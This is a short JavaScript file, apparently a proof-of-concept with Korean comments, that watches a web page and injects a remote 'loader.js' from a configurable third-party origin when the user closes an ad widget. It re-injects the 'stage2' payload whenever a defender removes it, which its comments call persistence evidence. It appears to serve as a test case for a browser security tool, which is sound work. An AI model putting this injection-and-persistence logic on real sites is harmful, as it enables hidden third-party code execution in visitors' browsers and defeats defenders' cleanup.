const statusEl = document.getElementById("status");

const REINJECT_COOLDOWN_MS = 2500;
let lastInjectAt = 0;

function getInjectSrc() {
  try {
    const cfg = window.__POC_H__ || {};
    if (cfg.loaderUrl) return String(cfg.loaderUrl);
    if (cfg.injectedUrl) return String(cfg.injectedUrl);
    if (cfg.thirdOrigin) return String(cfg.thirdOrigin).replace(/\/$/, "") + "/loader.js";
  } catch {}

  // runtime-config가 없는 환경(단독 실행 등)에서만 fallback
  return "http://localhost:4000/loader.js";
}

function setStatus(msg) {
  if (statusEl) statusEl.textContent = msg;
}

function injectOnce() {
  const now = Date.now();
  if (now - lastInjectAt < REINJECT_COOLDOWN_MS) {
    console.log("재주입 쿨다운 중입니다.");
    return;
  }
  lastInjectAt = now;

  const src = getInjectSrc();
  const s = document.createElement("script");
  s.src = `${src}?ts=${now}`;
  s.async = true;
  s.onload = () => setStatus("Loader loaded (stage2 should run)");
  s.onerror = () => setStatus("Loader load error");
  (document.head || document.documentElement).appendChild(s);

  setStatus("Injecting loader.js …");
}

const obs = new MutationObserver((mutations) => {
  for (const m of mutations) {
    for (const n of m.removedNodes) {
      if (n && n.nodeType === 1 && n.id === "adWidgetContainer") {
        setStatus("Ad closed detected → injecting …");
        injectOnce();
      }

      // 방어자가 stage2를 제거하는 시나리오(= persistence evidence)
      if (n && n.nodeType === 1 && n.id === "pocH_stage2") {
        setStatus("Stage2 removed detected → reinjecting …");

        try {
          window.postMessage(
            {
              __BRS__: true,
              type: "PERSISTENCE_REINJECT",
              data: {
                reason: "stage2_removed",
                markerId: "pocH_stage2",
                injectSrc: getInjectSrc(),
                cooldownMs: REINJECT_COOLDOWN_MS,
                ts: Date.now()
              }
            },
            "*"
          );
        } catch {}

        injectOnce();
      }
    }
  }
});

document.addEventListener("DOMContentLoaded", () => {
  setStatus("Ready. (waiting for ad close)");
  obs.observe(document.documentElement, { childList: true, subtree: true });
});